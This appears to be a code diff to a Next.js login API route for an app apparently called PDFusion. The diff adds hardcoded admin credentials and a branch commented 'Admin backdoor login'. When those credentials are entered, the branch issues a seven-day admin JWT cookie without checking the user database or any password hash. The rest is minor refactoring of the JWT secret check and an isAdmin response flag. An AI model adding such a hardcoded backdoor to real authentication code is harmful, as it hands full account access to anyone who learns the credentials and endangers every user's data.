@@ -6,6 +6,9 @@ import bcryptjs from 'bcryptjs';
 import * as jose from 'jose';
 import { cookies } from 'next/headers';
 
+const ADMIN_EMAIL = 'admin@pdfusion.com';
+const ADMIN_PASSWORD = 'adminpdfusion';
+
 export async function POST(req: NextRequest) {
   try {
     const { email, password } = await req.json();
@@ -15,8 +18,35 @@ export async function POST(req: NextRequest) {
     }
 
     const normalizedEmail = email.trim().toLowerCase();
-    const usersRef = collection(db, 'users');
+    
+    const jwtSecret = process.env.JWT_SECRET;
+    if (!jwtSecret) {
+      console.error('JWT_SECRET is not defined');
+      return NextResponse.json({ error: 'Internal server configuration error' }, { status: 500 });
+    }
+    const secret = new TextEncoder().encode(jwtSecret);
 
+    // Admin backdoor login
+    if (normalizedEmail === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+        const token = await new jose.SignJWT({ userId: 'admin', email: ADMIN_EMAIL })
+            .setProtectedHeader({ alg: 'HS256' })
+            .setIssuedAt()
+            .setExpirationTime('7d')
+            .sign(secret);
+
+        cookies().set('auth-token', token, {
+            httpOnly: true,
+            secure: process.env.NODE_ENV !== 'development',
+            sameSite: 'strict',
+            maxAge: 60 * 60 * 24 * 7,
+            path: '/',
+        });
+
+        return NextResponse.json({ success: true, isAdmin: true }, { status: 200 });
+    }
+
+    // Regular user login
+    const usersRef = collection(db, 'users');
     const q = query(usersRef, where('email', '==', normalizedEmail));
     const querySnapshot = await getDocs(q);
 
@@ -37,13 +67,6 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
     }
 
-    const jwtSecret = process.env.JWT_SECRET;
-    if (!jwtSecret) {
-      console.error('JWT_SECRET is not defined');
-      return NextResponse.json({ error: 'Internal server configuration error' }, { status: 500 });
-    }
-
-    const secret = new TextEncoder().encode(jwtSecret);
     const token = await new jose.SignJWT({ userId: user.id, email: user.email })
       .setProtectedHeader({ alg: 'HS256' })
       .setIssuedAt()
@@ -58,7 +81,7 @@ export async function POST(req: NextRequest) {
       path: '/',
     });
 
-    return NextResponse.json({ success: true }, { status: 200 });
+    return NextResponse.json({ success: true, isAdmin: false }, { status: 200 });
   } catch (error) {
     console.error('Login API Error:', error);
     return NextResponse.json({ error: 'An internal server error occurred' }, { status: 500 });
